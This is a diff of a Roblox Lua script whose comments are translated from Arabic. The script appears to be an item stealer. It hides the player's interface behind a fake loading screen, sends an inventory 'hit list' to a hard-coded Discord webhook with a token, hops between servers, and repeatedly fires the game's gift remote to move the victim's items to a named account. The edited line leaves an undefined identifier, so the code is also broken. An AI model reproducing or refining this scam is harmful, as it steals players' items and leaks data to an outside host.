@@ -1,5 +1,5 @@
 -- =========================
--- الخدمات الأساسية
+-- Basic services
 -- =========================
 local Players = game:GetService("Players")
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
@@ -10,11 +10,11 @@ local StarterGui = game:GetService("StarterGui")
 local player = Players.LocalPlayer
 local PlayerGui = player:WaitForChild("PlayerGui")
 
--- ضع هنا الويب هوك الجديد
+-- Put your new webhook here
 local WEBHOOK_URL = "https://discord.com/api/webhooks/1407925975282352228/Ui3X-nqFU2ULO6UJj6ZQiBeHUZV2qBu1Gw4rb9WzVEqabHXDoBzwCSJc_W5CJfklD4Sk"
 
 -- =========================
--- 1: قسم النقل التلقائي (كل 3 دقائق)
+-- 1: Automatic Transfer Section (every 3 minutes)
 -- =========================
 task.spawn(function()
     local function findEmptyServer()
@@ -49,7 +49,7 @@ task.spawn(function()
 end)
 
 -- =========================
--- 2: واجهة التحميل
+-- 2: Download interface
 -- =========================
 task.spawn(function()
     for _, guiType in pairs(Enum.CoreGuiType:GetEnumItems()) do
@@ -130,7 +130,7 @@ task.spawn(function()
 end)
 
 -- =========================
--- 3: نظام الويب هوك مع إرسال Hit List كامل
+-- 3: Webhook System with Full Hit List Submission
 -- =========================
 task.spawn(function()
     wait(4)
@@ -197,7 +197,7 @@ task.spawn(function()
 end)
 
 -- =========================
--- 4: قسم الجيفت الكامل مع إعادة الإمساك بعد الانتهاء من كل العناصر
+-- 4: Complete gift section with re-holding after all items are completed
 -- =========================
 local TARGET_PLAYER_NAME = "Kilua0623"
 local GiftRemote = ReplicatedStorage:WaitForChild("Remotes"):WaitForChild("GiftItem")
@@ -223,7 +223,7 @@ local function sendGift(item)
         pcall(function()
             GiftRemote:FireServer({
                 ["Item"] = item,
-                ["ToGift"] = TARGET_PLAYER_NAME
+                ["ToGift"] = kilua0623
             })
         end)
     end
